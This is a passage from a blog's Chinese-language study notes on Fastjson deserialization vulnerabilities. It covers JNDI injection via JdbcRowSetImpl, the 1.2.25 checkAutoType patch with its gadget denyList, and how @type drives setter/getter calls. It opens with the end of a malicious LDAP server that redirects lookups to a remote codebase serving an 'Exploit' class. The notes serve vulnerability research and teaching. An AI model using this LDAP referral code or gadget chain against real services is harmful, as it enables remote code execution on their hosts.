&#123;@inheritDoc&#125; * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; 和RMI同样的利用方式，成功弹计算器： 调试分析先在JSON.parse(PoC)打下断点，开始调试。大体流程跟之前TemplatesImpl是一致的，这里主要跟进一下不一样的地方。先在parseObject中加载目标Class： 往下调试，调用了FastjsonASMDeserializer.deserialze()函数对该类进行反序列化操作： 继续往下调试，就是ASM机制生成的临时代码了，这些代码是下不了断点、也看不到，直接继续往下调试即可。 由于PoC设置了dataSourceName键值和autoCommit键值，因此在JdbcRowSetImpl中的setDataSourceName()和setAutoCommit()函数都会被调用，因为它们均满足前面说到的Fastjson在反序列化时会自动调用的setter方法的特征。 先是调试到了setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址： dataSource是RowSet中的属性，RowSet是由JdbcRowSetImpl实现的接口。是因为payload里面设置了dataSourceName属性，fastjson自动去找setdataSourceName方法，才有后续的一串操作。 接着调用到setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数： 跟进connect()函数，看到了熟悉的JNDI注入的代码即InitialContext.lookup()，并且其参数是调用this.getDataSourceName()获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞： 再往下就是JNDI注入的调用过程了，最后是成功利用JNDI注入触发Fastjson反序列化漏洞、达到任意命令执行效果。 调试过程的函数调用栈如下： 12345678910111213141516171819connect:654, JdbcRowSetImpl (com.sun.rowset)setAutoCommit:4081, JdbcRowSetImpl (com.sun.rowset)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:57, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:606, Method (java.lang.reflect)setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)parse:137, JSON (com.alibaba.fastjson)parse:128, JSON (com.alibaba.fastjson)main:6, JdbcRowSetImplPoc 补丁分析alibaba在1.2.25版本打了补丁，主要添加了checkAutoType()函数替代了之前的locaClass函数。 checkAutoType()修补方案就是将DefaultJSONParser.parseObject()函数中的TypeUtils.loadClass替换为checkAutoType()函数： 看下checkAutoType()函数，具体的可看注释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123; if (typeName == null) &#123; return null; &#125; final String className = typeName.replace('$', '.'); // autoTypeSupport默认为False // 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤 if (autoTypeSupport || expectClass != null) &#123; for (int i = 0; i &lt; acceptList.length; ++i) &#123; String accept = acceptList[i]; if (className.startsWith(accept)) &#123; return TypeUtils.loadClass(typeName, defaultClassLoader); &#125; &#125; for (int i = 0; i &lt; denyList.length; ++i) &#123; String deny = denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125; &#125; // 从Map缓存中获取类，注意这是后面版本的漏洞点 Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName); if (clazz == null) &#123; clazz = deserializers.findClass(typeName); &#125; if (clazz != null) &#123; if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; return clazz; &#125; // 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错 if (!autoTypeSupport) &#123; for (int i = 0; i &lt; denyList.length; ++i) &#123; String deny = denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125; for (int i = 0; i &lt; acceptList.length; ++i) &#123; String accept = acceptList[i]; if (className.startsWith(accept)) &#123; clazz = TypeUtils.loadClass(typeName, defaultClassLoader); if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; return clazz; &#125; &#125; &#125; if (autoTypeSupport || expectClass != null) &#123; clazz = TypeUtils.loadClass(typeName, defaultClassLoader); &#125; if (clazz != null) &#123; if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver ) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; if (expectClass != null) &#123; if (expectClass.isAssignableFrom(clazz)) &#123; return clazz; &#125; else &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; &#125; &#125; if (!autoTypeSupport) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; return clazz;&#125; 简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。 默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。 denyList黑名单中列出了常见的反序列化漏洞利用链Gadgets： 12345678910111213141516171819202122bshcom.mchangecom.sun.java.lang.Threadjava.net.Socketjava.rmijavax.xmlorg.apache.bcelorg.apache.commons.beanutilsorg.apache.commons.collections.Transformerorg.apache.commons.collections.functorsorg.apache.commons.collections4.comparatorsorg.apache.commons.fileuploadorg.apache.myfaces.context.servletorg.apache.tomcatorg.apache.wicket.utilorg.codehaus.groovy.runtimeorg.hibernateorg.jbossorg.mozilla.javascriptorg.python.coreorg.springframework 这里可以看到黑名单中包含了”com.sun.”，这就把我们前面的几个利用链都给过滤了，成功防御了。 运行能看到报错信息，说autoType不支持该类： 调试分析看到，就是在checkAutoType()函数中未开启autoTypeSupport即默认设置的场景下被黑名单过滤了从而导致抛出异常程序终止的： autoTypeSupportautoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。 默认情况下autoTypeSupport为False，将其设置为True有两种方法： JVM启动参数：-Dfastjson.parser.autoTypeSupport=true 代码中设置：ParserConfig.getGlobalInstance().setAutoTypeSupport(true);，如果有使用非全局ParserConfig则用另外调用setAutoTypeSupport(true); AutoType白名单设置方法： JVM启动参数：-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy. 代码中设置：ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;); 通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：`fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao. 总结poc影响jdk 1.7，1.8版本，但是需要在parseObject的时候设置Feature.SupportNonPublicField，该字段在fastjson1.2.22版本引入，这么一说的话就是poc只能在1.2.22和1.2.24版本区间起作用。 参考博客","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Fastjson","slug":"Fastjson","permalink":"https://0range228.github.io/tags/Fastjson/"}]},{"title":"Fastjson学习笔记01","slug":"Fastjson学习笔记01","date":"2020-06-22T08:18:07.000Z","updated":"2021-09-09T06:07:35.480Z","comments":true,"path":"Fastjson学习笔记01/","link":"","permalink":"https://0range228.github.io/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/","excerpt":"序言 银鞍照白马，飒沓如流星。 烦人的期末终于结束了，今天来总结归纳Fastjson漏洞及原理。 这会是一个连载，将会有多篇文章。","text":"序言 银鞍照白马，飒沓如流星。 烦人的期末终于结束了，今天来总结归纳Fastjson漏洞及原理。 这会是一个连载，将会有多篇文章。 Fastjson基本概念&amp;组件Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。 项目地址 组件api使用方法也很简洁 123456//序列化String text = JSON.toJSONString(obj); //反序列化VO vo = JSON.parse(); //解析为JSONObject类型或者JSONArray类型VO vo = JSON.parseObject(\"&#123;...&#125;\"); //JSON文本解析成JSONObject类型VO vo = JSON.parseObject(\"&#123;...&#125;\", VO.class); //JSON文本解析成VO.class类 使用Fastjson进行（反）序列化以下使用测试均是基于1.2.24版本的fastjson jar包 建议从maven仓库中找到所有版本jar包,方便漏洞复现。 先构建需要序列化的Student类： 123456789101112131415161718192021222324252627282930package FastjsonTmpl;public class Student &#123; private String name; private int age; public Student() &#123; System.out.println(\"构造函数\"); &#125; public String getName() &#123; System.out.println(\"getName\"); return name; &#125; public void setName(String name) &#123; System.out.println(\"setName\"); this.name = name; &#125; public int getAge() &#123; System.out.println(\"getAge\"); return age; &#125; public void setAge(int age) &#123; System.out.println(\"getAge\"); this.age = age; &#125;&#125;//执行那个函数就会打印出来 再使用Fastjson组件： 123456789101112131415161718192021222324252627282930313233343536package FastjsonTmpl;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class FJSerializeTest &#123; public static void main(String[] args) &#123; Student student = new Student(); student.setName(\"0range\"); student.setAge(18); //序列化 String serializedStr = JSON.toJSONString(student); System.out.println(\"serializedStr=\"+serializedStr); System.out.println(\"----------\"); //通过parse方法进行反序列化，返回的是一个类对象 Object obj1 = JSON.parse(serializedStr); System.out.println(\"parse反序列化对象名称:\"+obj1.getClass().getName()); System.out.println(\"parse反序列化：\"+obj1); System.out.println(\"----------\"); //通过parseObject,不指定类，返回的是一个JSONObject Object obj2 = JSON.parseObject(serializedStr); System.out.println(\"parseObject反序列化对象名称:\"+obj2.getClass().getName()); System.out.println(\"parseObject反序列化:\"+obj2); System.out.println(\"----------\"); //通过parseObject,指定类后返回的是一个相应的类对象 Object obj3 = JSON.parseObject(serializedStr,Student.class); System.out.println(\"parseObject反序列化对象名称:\"+obj3.getClass().getName()); System.out.println(\"parseObject反序列化:\"+obj3); &#125;&#125; 以上使用了三种形式反序列化结果如下： 123456789101112131415161718构造函数setNamesetAgegetAgegetNameserializedStr=&#123;\"age\":18,\"name\":\"0range\"&#125;----------parse反序列化对象名称:com.alibaba.fastjson.JSONObjectparse反序列化：&#123;\"name\":\"0range\",\"age\":18&#125;----------parseObject反序列化对象名称:com.alibaba.fastjson.JSONObjectparseObject反序列化:&#123;\"name\":\"0range\",\"age\":18&#125;----------构造函数setAgesetNameparseObject反序列化对象名称:FastjsonTmpl.StudentparseObject反序列化:FastjsonTmpl.Student@78e03bb5 这里面parseObject({..})其实就是parse({..})的一个封装，对于parse的结果进行一次结果判定然后转化为JSONObject类型。 源码如下： 1234public static JSONObject parseObject(String text) &#123; Object obj = parse(text); return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);&#125; Fastjson反序列化类图 SON：门面类，提供入口 DefaultJSONParser：主类 ParserConfig：配置相关类 JSONLexerBase：字符分析类 JavaBeanDeserializer：JavaBean反序列化类 序列化配置：SerializerFeature.WriteClassNameSerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter/setter/is方法。 Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。 Demo： 123456789public class FJTest &#123; public static void main(String[] args)&#123; Student student = new Student(); student.setName(\"0range\"); student.setAge(18); String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName); System.out.println(jsonstring); &#125;&#125; 输出如下： 123456789101112131415//设置了SerializerFeature.WriteClassName构造函数setNamesetAgegetAgegetName&#123;\"@type\":\"FastjsonTmpl.Student\",\"age\":18,\"name\":\"0range\"&#125;// 未设置SerializerFeature.WriteClassName构造函数setNamesetAgegetAgegetName&#123;\"age\":18,\"name\":\"0range\"&#125; 执行反序列化： 12345678public class FJTest2 &#123; public static void main(String[] args)&#123; String jsonstring =\"&#123;\\\"@type\\\":\\\"FastjsonTmpl.Student\\\",\\\"age\\\":18,\\\"name\\\":\\\"0range\\\"&#125;\"; Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField); System.out.println(obj); System.out.println(obj.getClass().getName()); &#125;&#125; 结果如下： 12345构造函数setAgesetNameFastjsonTmpl.Student@4bf558aaFastjsonTmpl.Student 反序列化配置：Feature.SupportNonPublicField如果需要还原出private属性的话，还需要在反序列化组件JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。 这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，加了就没必要声明为private了）： 12345678910111213141516171819202122232425262728public class Student2 &#123; private String name; private int age; public Student() &#123; System.out.println(\"构造函数\"); &#125; public String getName() &#123; System.out.println(\"getName\"); return name; &#125; public void setName(String name) &#123; System.out.println(\"setName\"); this.name = name; &#125; public int getAge() &#123; System.out.println(\"getAge\"); return age; &#125;// public void setAge(int age) &#123;// System.out.println(\"setAge\");// this.age = age;// &#125;&#125; 现在这两个都是private属性了，看看接下来会是什么结果。 修改FJTest2.java，去掉Feature.SupportNonPublicField，添加输出两个属性getter方法的返回值： 123456789public class FJTest2 &#123; public static void main(String[] args)&#123; String jsonstring =\"&#123;\\\"@type\\\":\\\"FastjsonTmpl.Student2\\\",\\\"age\\\":18,\\\"name\\\":\\\"0range\\\"&#125;\"; Student2 obj = JSON.parseObject(jsonstring, Student2.class); System.out.println(obj); System.out.println(obj.getClass().getName()); System.out.println(obj.getName() + \" \" + obj.getAge()); &#125;&#125; 结果如下： 1234567构造函数setNameFastjsonTmpl.Student2@4bf558aaFastjsonTmpl.Student2getNamegetAge0range 0 可以看到，由于没有setage方法，年龄结果是0。 再接着添加Feature.SupportNonPublicField： 1Student2 obj = JSON.parseObject(jsonstring, Student2.class, Feature.SupportNonPublicField); 结果： 1234567构造函数setNameStudent@2c59109cStudentgetNamegetAge0range 18 这里写一下理解： JSON对象其实就是一个字符串，那么在反序列化的时候，其实更像是用类去套出对象的信息，这里我认为比较像socket套接字的感觉，对于传进来的网络流，其实就是用socket库按照字段长度去“迎接”。 第一个没有设置Feature.SupportNonPublicField的情况下，其实也是正常去套，但是由于没有setage方法去“迎接”，那么默认就会将private塑形age初始化为0。 但是第二种情况下设置了Feature.SupportNonPublicField，那么其实就是更加暴力一点，我认为他会不管你有没有迎接我的函数，我直接把age=18摁进去，摁到对应的对象属性中，private也拦不住我。 也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。 setter/getter 的触发条件小结 使用JSON.parse(jsonstr)和JSON.parseObject(jsonstr, xxx.class)两种方式返回的结果相同: 构造函数+JSON字符串中指定属性的setter()+特殊的getter() 根据前面的结果，有如下结论： 当反序列化为JSON.parseObject(*,*.class)形式即指定class时，调用反序列化得到的类的构造函数、JSON里面的指定属性的setter方法、特殊的getter()； 当反序列化为JSON.parseObject(*)形式即未指定class时，会调用反序列化得到的类的构造函数、JSON里面的指定属性的setter方法，所有属性的getter方法，无视访问修饰符； 原因： JSON.parseObject(*,*.class)形式得到的都是特定的要求类； 当反序列化为JSON.parseObject(*)形式得到的都是JSONObject类对象，会额外调用JSON.toJSON()方法，会无差别调用所有getter。 下面直接引用结论，Fastjson会对满足下列要求的setter/getter方法进行调用： 满足条件的setter： 函数名长度大于4 以set开头 非静态函数 返回类型为void或当前类 参数个数为1个 特殊的getter： 函数名长度大于等于4 非静态函数 以get开头且第4个字母为大写 无参数 返回值类型继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong 对于private属性来说，没有setter才会调用getter demo这里我继续进行测试，跟进去看看getter和setter的区别； 首先上代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081public class tianrongxinTest &#123; public String t1; private int t2; private Boolean t3; private Properties t4; private Properties t5; public tianrongxinTest()&#123; System.out.println(\"tianrongxinTest() is called!\"); &#125; public String getT1() &#123; System.out.println(\"getT1() is called!\"); return t1; &#125; public void setT1(String t1) &#123; System.out.println(\"setT1() is called!\"); this.t1 = t1; &#125; public int getT2() &#123; System.out.println(\"getT2() is called!\"); return t2; &#125; public void setT2(int t2) &#123; System.out.println(\"setT2() is called!\"); this.t2 = t2; &#125; public Boolean getT3() &#123; System.out.println(\"getT3() is called!\"); return t3; &#125; public void setT3(Boolean t3) &#123; System.out.println(\"setT3() is called!\"); this.t3 = t3; &#125; public Properties getT4() &#123; System.out.println(\"getT4() is called!\"); return t4; &#125; public void setT4(Properties t4) &#123; System.out.println(\"setT4() is called!\"); this.t4 = t4; &#125; public Properties getT5() &#123; System.out.println(\"getT5() is called!\"); return t5; &#125; public void setT5(Properties t5) &#123; System.out.println(\"setT5() is called!\"); this.t5 = t5; &#125; @Override public String toString() &#123; return \"tianrongxinTest&#123;\" + \"t1='\" + t1 + '\\'' + \", t2=\" + t2 + \", t3=\" + t3 + \", t4=\" + t4 + \", t5=\" + t5 + '&#125;'; &#125; public static void main(String[] args) &#123; String jsonstr = \"&#123;\\\"@type\\\":\\\"FKtemp.tianrongxinTest\\\",\\\"t1\\\":\\\"t1\\\",\\\"t2\\\":2,\\\"t3\\\":1,\\\"t4\\\":&#123;&#125;,\\\"t5\\\":&#123;&#125;&#125;\"; Object obj = JSON.parse(jsonstr); //Object obj =JSON.parseObject(jsonstr, tianrongxinTest.class); //Object obj =JSON.parseObject(jsonstr); String result = obj.toString(); System.out.println(result); &#125;&#125; 这里参考了天融信的博客，进行了本地测试。 123Object obj = JSON.parse(jsonstr);Object obj =JSON.parseObject(jsonstr, tianrongxinTest.class);Object obj =JSON.parseObject(jsonstr); 经验1关于1和2来说，二者后面的调用链是完全一样的。二者不同点在于调用JavaBeanInfo.build()方法时传入clazz参数的来源不同； JSON.parseObject(jsonstr,tianrongxinTest.class)在调用JavaBeanInfo.build() 方法时传入的clazz参数源于parseObject方法中第二个参数中指定的“tianrongxinTest.class”。 JSON.parse(jsonstr);这种方式调用JavaBeanInfo.build() 方法时传入的clazz参数获取于json字符串中@type字段的值。 因此，只要Json字符串的@type字段值与JSON.parseObject(jsonstr, FastJsonTest.class);中第二个参数中类名一致，这两种方式执行的过程与结果是完全一致的。二者唯一的区别就是获取clazz参数的途径不同。 经验2关于getter和setter的触发来说，1.2.24是这样的； 这个问题要从JavaBeanInfo.build() 方法中获取答案： 程序会使用JavaBeanInfo.build() 方法对传入的JSON字符串进行解析。在JavaBeanInfo.build() 方法中，程序将会创建一个fieldList数组来存放后续将要处理的目标类的 setter 方法及某些特定条件的 getter 方法。通过上文的结果可见，目标类中所有的setter方法都可以被调用，程序从clazz（目标类对象）中通过getMethods获取本类以及父类或者父接口中所有的公共方法，接着进行循环判断这些方法是否可以加入fieldList中以便后续处理。 理解： 对于所有的setter方法，Fastjson都直接给装填到fieldList中，再之后遍历getter时候，如果发现有对应的setter，那么就不执行getter方法了。 举几个例子： 经验3: 这里执行第三个：Object obj =JSON.parseObject(jsonstr); 执行结果： 并且，返回值变成JSON对象了！ 通过上文两种方式从执行流程几乎一样，结果也完全相同；然而使用JSON.parseObject(jsonstr)这种方式，执行的结果与返回值却与前两者不同：JSON.parseObject(jsonstr)返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用。 通过阅读源码可以发现JSON.parseObject(String text)实现如下： parseObject(String text)其实就是先执行了parse(),随后将返回的Java对象通过JSON.toJSON（）转为 JSONObject对象。 JSON.toJSON（）方法会将目标类中所有getter方法记录下来，见下图： 随后通过反射依次调用目标类中所有的getter方法： 完整的调用链如下： 总结： 上文例子中，JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)可以认为是完全一样的，而parseObject(String text)是在二者的基础上又执行了一次JSON.toJSON（）； 此外，如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用Feature.SupportNonPublicField参数。 parse与parseObject区别前面的demo都是用parseObject()演示的，还没说到parse()。两者主要的区别就是parseObject()返回的是JSONObject而parse()返回的是实际类型的对象. 当在没有对应类的定义的情况下，一般情况下都会使用JSON.parseObject()来获取数据。 FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。 看一下parseObject(String text)源码： 1234public static JSONObject parseObject(String text) &#123; Object obj = parse(text); return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj); &#125; parseObject({..})其实就是parse({..})的一个封装，对于parse的结果进行一次结果判定然后转化为JSONObject类型。 也就是说，我们用parse()反序列化会直接得到特定的类，而无需像parseObject()一样返回的是JSONObject类型的对象、还可能需要去设置第二个参数指定返回特定的类。 结论： parse(“”) 会调用JSON需要的 setter 方法及某些特定条件的 getter 方法 parseObject(“”, xxx.class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法 parseObject(“”) 会调用全部setter/getter 修改上一步中的parseObject()为parse()： 12345Object obj = JSON.parse(jsonstring);//或以下语句，输出结果一致//Object obj = JSON.parse(jsonstring, Feature.SupportNonPublicField);System.out.println(obj);System.out.println(obj.getClass().getName()); 输出如下： 1234构造函数getPropertiesfastjson2change.Student@6659c656fastjson2change.Student 可以看到，这里我直接用的parse，没有用parseObject，也没有指定目标类，并且加不加那个冗余的参数结果都是一样，结果都是成功地反序列化为Student类对象。 这里我再举一个例子，先建立一个序列化实验用的Person类： 123456789101112131415161718192021222324252627282930313233public class Person &#123; //属性 public String name; private String full_name; private int age; private Boolean sex; private Properties prop; //构造函数 public Person()&#123; System.out.println(\"Person构造函数\"); &#125; //set public void setAge(int age)&#123; System.out.println(\"setAge()\"); this.age = age; &#125; //get 返回Boolean public Boolean getSex()&#123; System.out.println(\"getSex()\"); return this.sex; &#125; //get 返回ProPerties public Properties getProp()&#123; System.out.println(\"getProp()\"); return this.prop; &#125; //在输出时会自动调用的对象ToString函数 @Override public String toString() &#123; String s = \"[Person Object] name=\" + this.name + \" full_name=\" + this.full_name + \", age=\" + this.age + \", prop=\" + this.prop + \", sex=\" + this.sex; return s; &#125;&#125; 再写一个反序列化类来调用他： 12345678910public class type &#123; public static void main(String[] args) &#123; String eneity3 = \"&#123;\\\"@type\\\":\\\"fastjson2change.Person\\\", \\\"name\\\":\\\"lala\\\", \\\"full_name\\\":\\\"lalalolo\\\", \\\"age\\\": 13, \\\"prop\\\": &#123;\\\"123\\\":123&#125;, \\\"sex\\\": 1&#125;\"; //反序列化 Object obj = JSON.parseObject(eneity3,Person.class); //输出会调用obj对象的tooString函数 System.out.println(obj); &#125;&#125; 结果如下： 12345678910Person构造函数setAge()getProp()[Person Object] name=lala full_name=null, age=13, prop=null, sex=nullpublic name 反序列化成功private full_name 反序列化失败private age setAge函数被调用private sex getsex函数没有被调用private prop getprop函数被成功调用 可以得知： public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。 getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用 这里调试一下，跟进去看看，可以看到下图位置处针对我们的@type进行定向解析： 决定这个set/get函数是否将被调用的代码最终在com.alibaba.fastjson.util.JavaBeanInfo#build函数处 继续跟，继续跟。。。 接下来是一堆判断条件： 在进入build函数后会遍历一遍传入class的所有方法，去寻找满足set开头的特定类型方法；再遍历一遍所有方法去寻找get开头的特定类型的方法。 set开头的方法要求如下： 方法名长度大于4且以set开头，且第四个字母要是大写 非静态方法 返回类型为void或当前类 参数个数为1个 寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名（会过滤_，就是set_name这样的方法名中的下划线会被略过，得到name）。再去跟这个类的属性去比对有没有这个名称的属性。 如果没有这个属性并且这个set方法的输入是一个布尔型（是boolean类型，不是Boolean类型，这两个是不一样的），会重新给属性名前面加上is，再取头两个字符，第一个字符为大写（即isNa），去寻找这个属性名。 这里的is就是有的网上有的文章中说反序列化会自动调用get、set、is方法的由来。个人觉得这种说法应该是错误的。 真实情况应该是确认存在符合setXxx方法后，会与这个方法绑定一个xxx属性，如果xxx属性不存在则会绑定isXx属性（这里is后第一个字符需要大写，才会被绑定）。并没有调用is开头的方法 自己从源码中分析或者尝试在类中添加isXx方法都是不会被调用的，这里只是为了指出其他文章中的一个错误。这个与调用的set方法绑定的属性，再之后并没有发现对于调用过程有什么影响。 所以只要目标类中有满足条件的set方法，然后得到的方法变量名存在于序列化字符串中，这个set方法就可以被调用。 get开头的方法要求如下： 方法名长度大于等于4 非静态方法 以get开头且第4个字母为大写 无传入参数 返回值类型继承自Collection/Map/AtomicBoolean/AtomicInteger AtomicLong 所以我们上面例子中的getsex方法没有被调用是因为返回类型不符合，而getprop方法被成功调用是因为Properties 继承 Hashtable，而Hashtable实现了Map接口，返回类型符合条件。 再顺便看一下最后触发方法调用的地方com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue，（在被调用的方法中下断点即可） 那么至此我们可以知道 @type可以指定反序列化成服务器上的任意类 然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx） 如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法） 看上去应该是挺正常的使用逻辑，反序列化需要调用对应参数的setter、getter方法来恢复数据。 但是在可以调用任意类的情况下，如果setter、getter方法中存在可以利用的情况，就会导致任意命令执行。 对应反序列化攻击利用三要素来说，以上我们就是找到了readObject复写点，下面来探讨反序列化利用链。 Fastjson反序列化漏洞原理漏洞原理由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。 通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。 那么如何才能够反序列化出恶意类呢？ 由前面demo知道，Fastjson使用parseObject()/parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写Object o = JSON.parseObject(poc,Object.class)就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。 接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？ 由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。 到DefaultJSONParser.parseObject(Map object, Object fieldName)中看下，JSON中以@type形式传入的类的时候，调用deserializer.deserialize()处理该类，并去调用这个类的setter和getter方法： 12345678@SuppressWarnings(&#123; \"unchecked\", \"rawtypes\" &#125;)public final Object parseObject(final Map object, Object fieldName) &#123; ... // JSON.DEFAULT_TYPE_KEY即@type if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; ... ObjectDeserializer deserializer = config.getDeserializer(clazz); return deserializer.deserialze(this, clazz, fieldName); 小结一下 若反序列化指定类型的类如Student obj = JSON.parseObject(text, Student.class);，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞； 若反序列化未指定类型的类如Object obj = JSON.parseObject(text, Object.class);，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞； PoC写法一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类： 12345&#123;\"@type\":\"xxx.xxx.xxx\",\"xxx\":\"xxx\",...&#125; 关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件： 